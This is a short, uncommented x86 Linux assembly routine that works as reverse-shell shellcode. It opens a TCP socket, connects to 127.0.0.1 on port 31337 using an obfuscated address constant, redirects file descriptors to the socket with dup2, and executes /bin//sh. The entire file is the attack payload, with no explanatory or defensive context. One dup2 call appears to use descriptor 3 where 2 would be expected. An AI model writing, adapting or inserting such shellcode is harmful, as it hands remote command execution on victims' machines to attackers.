.global myfunc
myfunc:
	
	mov $0xbffe1111,%edx	

	xor %eax,%eax
	add $0x66,%eax
	
	xor %ebx,%ebx
	inc %ebx
	
	xor %ecx,%ecx	
	add $0x6,%ecx	
	push %ecx
	sub $0x5,%ecx	
	push %ecx
	inc %ecx	
	push %ecx
	mov %esp,%ecx	
	int $0x80

	mov %eax,%edx

	mov $0x12111190,%eax
	sub $0x11111111,%eax	
	push %eax

	push $0x697a
	xor %ecx, %ecx	
	add $0x02,%ecx
	push %ecx	
	mov %esp,%edi
	sub %ebx,%ebx
	add $0x10,%ebx	
	pushl %ebx
	pushl %edi
	pushl %edx

	movl %esp,%ecx
	sub %ebx,%ebx
	add $0x3,%ebx

	sub %eax,%eax
	add $0x66,%eax	
	int $0x80
	sub %ecx,%ecx
	

	sub %eax,%eax
	add $0x3f,%eax	
	movl %edx,%ebx	
	int $0x80

	sub %eax,%eax
	add $0x3f,%eax	
	movl %edx,%ebx	
	inc %cl		
	int $0x80

	
	sub %eax,%eax
	add $0x3f,%eax	
	movl %edx,%ebx	
	add $0x2,%ecx	
	int $0x80
	sub %eax,%eax
	sub %edx,%edx
	pushl %eax
	pushl $0x68732f2f
	pushl $0x6e69622f	

	movl %esp,%ebx
	pushl %eax
	pushl %ebx
	movl %esp,%ecx

	sub %eax,%eax
	add $0xb,%eax	
	int $0x80

	sub %eax,%eax
	add $0x1,%eax
	int $0x80